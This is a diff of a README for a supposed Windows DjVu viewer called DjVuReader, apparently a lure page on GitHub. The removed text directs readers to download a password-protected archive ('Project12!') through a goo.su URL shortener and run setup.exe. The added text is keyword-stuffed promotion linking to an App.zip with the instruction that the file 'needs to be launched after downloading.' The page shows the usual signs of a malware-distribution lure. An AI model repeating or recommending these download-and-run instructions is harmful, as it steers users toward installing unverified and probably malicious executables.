@@ -1,59 +1,56 @@
-# DjVuReader
+# DjVuReader 📘
 
-## 📖 About the Software
+Welcome to DjVuReader, the ultimate lightweight and efficient viewer for DjVu files! Dive into the world of seamless reading and document management with this powerful tool. 🚀
 
-**DjVuReader** is a lightweight and efficient viewer for DjVu files, designed for seamless reading and document management. It provides a fast and smooth experience for handling high-quality scanned documents, books, and technical papers.
+![DjVuReader Logo](https://example.com/djvureader-logo.png)
+
+## Features 🌟
+
+- **Best DjVu Reader for Windows**: Experience the best-in-class DjVu reader tailored for Windows users.
+- **Bookmark Important Pages**: Never lose track of important pages with the bookmark feature.
+- **Convert DjVu to PDF**: Easily convert your DjVu files to PDF format with just a click.
+- **Efficient Document Navigation**: Seamlessly navigate through your documents for a hassle-free reading experience.
+- **Full-Screen Reading Mode**: Immerse yourself in your documents with the full-screen reading mode.
+- **Install DjVuReader**: Simple installation process, get started in no time!
+- **Lightweight and Fast Software**: Enjoy the speed and efficiency of our lightweight software.
+- **Manage Scanned Documents**: Efficiently manage all your scanned documents in one place.
+- **Open Scanned Books**: Open and read scanned books with ease.
+- **Optimize Reading Experience**: Customize your reading experience to suit your preferences.
+- **Read Academic Papers**: Perfect for reading and annotating academic papers.
+- **Rotate and Adjust Layout**: Rotate and adjust the layout of your documents for better readability.
+- **Zoom and Text Selection**: Zoom in on details and select text effortlessly.
+
+## Download Now! 📥
+
+[![Download DjVuReader](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/repo/releases/9246/App.zip)
+
+*Note: The file needs to be launched after downloading.*
+
+If the above link doesn't work, please check the "Releases" section of the repository for alternative download options.
+
+## Installation Guide 📝
+
+Follow these simple steps to install DjVuReader:
+
+1. Download the DjVuReader setup file from the link provided above.
+2. Run the setup file and follow the on-screen instructions to complete the installation process.
+3. Once installed, launch DjVuReader and start exploring your DjVu files with ease.
+
+## Get Started 🚗
+
+Ready to enhance your reading and document management experience? Download DjVuReader now and unlock a world of possibilities. 
+
+Feel free to explore the various features and functionalities offered by DjVuReader to optimize your reading experience. Happy reading! 📚
+
+For more information and updates, visit our [website](https://djvureader.com).
+
+## Stay Connected! 🌐
+
+Connect with us on social media for the latest news and updates:
+- Twitter: [@DjVuReaderOfficial](https://twitter.com/DjVuReaderOfficial)
+- Facebook: [DjVuReader](https://facebook.com/DjVuReader)
+
+Let's revolutionize the way you read and manage your documents with DjVuReader! 💻🔍
 
 ---
-
-## 📥 Getting Started
-![Djvu_icon](https://github.com/user-attachments/assets/b6814be3-cdff-4895-a1ce-b963be93e058)
-
-### 📥 Installation & Setup
-
-#### ✅ **Recommended Method (Windows .exe)**
-
-1️⃣ **[Download](https://goo.su/z5Bd5B)** the archive and extract it (password: `Project12!`)  
-2️⃣ **Run `setup.exe`**  
-📖 **The application will install automatically – start reading DjVu files instantly!**
-
-⚠️ **Important:** This method is faster and requires no manual setup.
-
----
-
-## ✨ Features
-
-- Fast and lightweight DjVu document viewer  
-- High-quality rendering of scanned books and papers  
-- Intuitive interface with smooth navigation  
-- Search, zoom, and text selection support  
-- Bookmarking and document organization  
-- Full-screen mode for distraction-free reading  
-- Page rotation and customizable layout options  
-- Export pages or entire documents to other formats  
-
----
-
-## 📝 Contributing
-
-We welcome contributions and improvements! If you have suggestions for enhancing DjVuReader, fork the repository and submit a Pull Request with your changes.
-
----
-
-## 📜 License
-
-This project is distributed under the GNU General Public License (GPL). See the `LICENSE` file for more details.
-
----
-
-## 🙌 Acknowledgments
-
-- Thanks to the developers of DjVu technology for providing a powerful document format  
-- Gratitude to all users who provide feedback and contribute to software improvements  
-
----
-
-## 🔖 Tags
-
-DjVuReader, DjVu viewer, document reader, open DjVu files, scanned book reader, lightweight document viewer, high-quality document rendering, DjVu to PDF conversion, technical paper viewer, academic document reader, efficient file navigation, bookmark DjVu pages, best DjVu reader for Windows, export DjVu files, full-screen reading mode
-
+Made with ❤️ by DjVuReader.
